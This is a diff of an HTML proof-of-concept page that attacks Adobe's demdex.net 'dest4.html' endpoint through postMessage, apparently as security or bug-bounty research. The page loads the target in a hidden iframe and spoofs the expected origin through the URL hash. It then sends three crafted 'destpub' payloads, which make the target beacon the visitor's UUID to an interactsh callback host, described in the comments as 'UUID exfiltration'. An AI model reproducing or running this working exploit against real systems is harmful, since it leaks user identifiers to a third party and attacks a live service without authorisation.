@@ -5,14 +5,20 @@
 </head>
 <body>
   <h2>PoC Running...</h2>
-  <div id="status"></div>
+  <div id="status">Loading...</div>
 
   <script>
-    var attacker  = "https://vqlgkysoxnjswaflcnwdnfne34x7tg7d0.oast.fun";
-    var target    = "https://adobe.demdex.net/dest4.html?d_nsid=0";
-    var iframeURL = target + "#" + attacker + "//" + "vqlgkysoxnjswaflcnwdnfne34x7tg7d0.oast.fun";
+    // Sender origin = GitHub Pages (must match hash)
+    var sender   = "https://elia874.github.io";
 
-    document.getElementById("status").innerText = "Loading iframe: " + iframeURL;
+    // Callback = interactsh (where UUID gets sent)
+    var callback = "https://vqlgkysoxnjswaflcnwdnfne34x7tg7d0.oast.fun";
+
+    // Hash sets demdexOrigin = sender origin ✅
+    var target   = "https://adobe.demdex.net/dest4.html?d_nsid=0";
+    var iframeURL = target + "#" + sender + "//elia874.github.io";
+
+    document.getElementById("status").innerText = "Iframe loading...";
 
     var iframe = document.createElement("iframe");
     iframe.style.display = "none";
@@ -20,20 +26,27 @@
     document.body.appendChild(iframe);
 
     iframe.onload = function () {
-      // Payload 1: Basic origin bypass check
-      var payload1 = "---destpub---dests|1|img|" + attacker + "/?test=origin_bypass|10080";
+      document.getElementById("status").innerText = "Iframe loaded! Sending payloads...";
 
-      // Payload 2: UUID exfiltration via %did% macro
-      var payload2 = "---destpub---dests|2|img|" + attacker + "/?uuid=%did%|10080";
+      // Payload 1: Basic connectivity test
+      var p1 = "---destpub---dests|1|img|" + callback + "/?hit=1_basic|10080";
 
-      // Payload 3: Debug mode + UUID
-      var payload3 = "---destpub-debug---dests|3|img|" + attacker + "/?debug=1&uuid=%did%|10080";
+      // Payload 2: UUID exfiltration
+      var p2 = "---destpub---dests|2|img|" + callback + "/?uuid=%did%|10080";
 
-      iframe.contentWindow.postMessage(payload1, "*");
-      iframe.contentWindow.postMessage(payload2, "*");
-      iframe.contentWindow.postMessage(payload3, "*");
+      // Payload 3: Debug mode
+      var p3 = "---destpub-debug---dests|3|img|" + callback + "/?debug=1&uuid=%did%|10080";
 
-      document.getElementById("status").innerText = "Payloads sent! Check interactsh...";
+      iframe.contentWindow.postMessage(p1, sender);
+      iframe.contentWindow.postMessage(p2, sender);
+      iframe.contentWindow.postMessage(p3, sender);
+
+      document.getElementById("status").innerText = 
+        "✅ Payloads sent! Watch interactsh for: ?hit=1_basic and ?uuid=...";
+    };
+
+    iframe.onerror = function() {
+      document.getElementById("status").innerText = "❌ Iframe blocked!";
     };
   </script>
 </body>
